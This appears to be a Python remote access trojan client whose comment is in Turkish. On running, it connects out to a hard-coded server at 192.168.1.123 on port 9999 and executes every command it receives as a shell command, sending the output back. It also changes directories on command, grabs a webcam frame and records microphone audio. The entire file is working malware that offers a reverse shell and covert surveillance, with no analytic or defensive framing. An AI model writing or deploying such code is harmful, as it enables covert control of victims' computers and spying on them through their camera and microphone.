import socket
import subprocess
import os
import cv2
import pyaudio
import wave

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("192.168.1.123", 9999))  # server_ip sunucunuzun IP adresi olacak

    while True:
        command = client.recv(1024).decode()
        
        if command == "exit":
            client.close()
            break
        elif command.startswith("cd "):
            os.chdir(command[3:])
            client.send(f"Directory changed to {os.getcwd()}".encode())
        elif command == "screenshot":
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cv2.imwrite("screenshot.png", frame)
            cap.release()
            client.send("Screenshot taken".encode())
        elif command == "record_audio":
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            RECORD_SECONDS = 5
            WAVE_OUTPUT_FILENAME = "output.wav"

            p = pyaudio.PyAudio()

            stream = p.open(format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            input=True,
                            frames_per_buffer=CHUNK)

            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            p.terminate()

            wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            client.send("Audio recorded".encode())
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            client.send(output.stdout + output.stderr)

connect_to_server()
